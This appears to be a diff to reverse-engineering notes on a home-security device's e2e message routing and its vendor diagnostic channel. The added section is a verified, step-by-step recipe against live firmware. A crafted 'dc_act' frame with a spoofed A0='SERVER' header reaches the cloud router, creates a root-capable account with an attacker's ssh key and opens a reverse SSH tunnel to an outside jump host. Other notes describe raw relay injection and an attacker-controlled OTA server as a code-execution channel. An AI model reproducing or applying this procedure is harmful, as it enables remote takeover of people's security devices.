@@ -260,13 +260,58 @@ Never commit that file: it contains live end/chat secrets.
   (`rc_enabled_by_default` = "sshd enabled by default", `access_security_level`)
   and the app probes `systemctl list-units ... dc-*.service` for the diag unit
   family. Serving `rc_enabled_by_default=true` alone did **not** start sshd;
-  activation needs the e2e user command, which is now feasible because the
-  captured real e2e response provides the session/chat secret.
-- Diagchan activation is **not** in the cloud `cloudr` magic-command set and not
-  in `/bmt/*` (there is no command-fetch endpoint). It comes from the vendor
-  support SDK (`com.dinsafer.dssupport.msctlib`) over the user channel; diagchan
-  has an `obfus.go`/`dec` layer, so the method is obfuscated. Use the injector
-  above to replay it once identified.
+  activation needs a cloud-path `dc_act` frame (see below), for which the
+  captured real e2e response still supplies the session/chat secret.
+- Diagchan activation is reached through the **cloud** router (`cloudr`), not
+  the `usersr` router: `dc_act` is a normal `cloudr` route that calls
+  `internal/diagchan.Activate`. The catch is **which e2e conn the frame lands
+  on**. The `msct/e2e` connfork demuxes every datagram per message:
+  `tower/message.(*Headers).ShouldGet(0xA0) == "SERVER"`
+  (`CheckIsServerMsg`) sends it to the **CloudConn** (`cloudConnFilter`), and
+  `CloudRecvIntcp` JSON-decodes the body; otherwise `F1` (proxy) sends it to
+  the **UserConn** (`userConnFilter`) where `usersr` has no `dc_act` route and
+  returns the `cmd not allowed` sentinel (or falls back to the cloud proxy).
+  A frame injected on the app/user channel therefore needs an extra
+  **`A0="SERVER"`** option (append it last so `ShouldGet` returns it; it may
+  be a duplicate of the sender). Omitting `F1` keeps it off the usersr path.
+  `internal/diagchan` has no `/bmt/*` command-fetch endpoint; the vendor
+  support SDK uses this same cloudr route.
+
+### Diagchan reachable on the app/users e2e channel (verified 2026-11-25)
+
+Reproduced end to end on the emulator (v2.35.3) **and** on live v2.35.5 with
+**no firmware patch and no OTA**:
+
+1. Build the `dc_act` frame as usual (`A0=sender`, `A1=group`, `A2=device`,
+   `A3` nonce, `B5` app id, `F6` fresh msgid, `F5="dc_act"`, `183`
+   `application/json`, AES-CBC with the device chat), then **append a second
+   `A0` option with the literal `SERVER`** and **omit `F1`**. The duplicate
+   `A0` loses the usersr sentinel; the frame is JSON-decoded by
+   `CloudRecvIntcp` and dispatched by `cloudr`.
+2. Body is `cloudr.DcActReq`: `h` (jump host), `p` (jump port), `u` (jump
+   user), `rp` (reverse port), `lp`, `lu` (local diag user), `lk`, `t`.
+   **Pass `lp=0`**: `Activate` defaults the local target port to
+   `0xE792 = 59282`, the module's real diag sshd port. `lp=22` targets a
+   closed port; the OpenSSH `forwarding to ... port 0` log line is a normal
+   artifact, not the target.
+3. `lu` must be a local uid>=1000 account the diagchan can create; use a
+   **fresh** name (`useradd -m -s /bin/bash -c diagchan_managed`), not a
+   pre-existing unmanaged account. `lk` must be the **full**
+   `ssh-ed25519 AAAA...` authorized_keys line (diagchan appends it verbatim).
+4. The reply is a `cloudr.DcActRsp` `{"__time","cmd","pk"}`. Authorize `pk` on
+   the jump sshd; the child then dials the jump and binds `rp` ->
+   `127.0.0.1:59282`. `ssh -p <rp> <lu>@<jump>` gives a shell (the account
+   gets `NOPASSWD:ALL` via `/etc/sudoers.d/diagchan-<lu>` on systems where
+   `grantPrivRule` succeeds).
+5. The message-level router swap experiments (`ProvideUsersServer` ->
+   cloudr) are **not** the route: the users server keeps its `bmtp` body
+   codec (`SetEncoding`), so `ctx.Bind` fails with
+   `bmtp: Unmarshal(non-pointer string)`. The `SERVER`-header trick needs no
+   binary change.
+
+This supersedes the earlier "diagchan is on the user channel" note: the vendor
+support client may *send* it on the user session, but the command is handled by
+the cloud router once the frame is marked as a server message.
 - `/bmt/get-global-config` returns a **list** of `{config_id, config_item,
   default_value, bmt_value, note}` items (see `vendor_get-global-config.json`),
   not an object under `config`.
@@ -290,6 +335,19 @@ handshake. Only then do commands dispatch; `get_chips_status` (0xA011 ->
 triggers the staged install. A bare frame without `estab`/PROXY is ACKed by
 the relay but not executed - that is what the earlier emulator attempt
 observed (the 211-byte reply is the transport ACK).
+
+Two important qualifications found 2026-11-25:
+
+- **The relay control bypasses the app-side handshake.** The relay's
+  `{"op":"send","b64":...}` writes the frame **raw to the device socket**;
+  no `estab`/app forwarding is involved. A control-sent frame is dispatched
+  by the device's own e2e connfork purely from its headers, which is how the
+  `dc_act` proof above works. The `estab` requirement applies to frames sent
+  as an app *through* the relay's forward path.
+- **`F1`/`A0=SERVER` selects the router** (see the diagchan subsection): keep
+  `F1` for `usersr` commands, add `A0="SERVER"` and omit `F1` for `cloudr`
+  commands (e.g. `dc_act`). The per-message demux is independent of the login
+  identity and the sender end.
 
 - **The app OTA is the proven remote-code channel.** `/bmt/get-latest-ver-url`
   returns a manifest (md5 + url + version) that the takeover server authors;
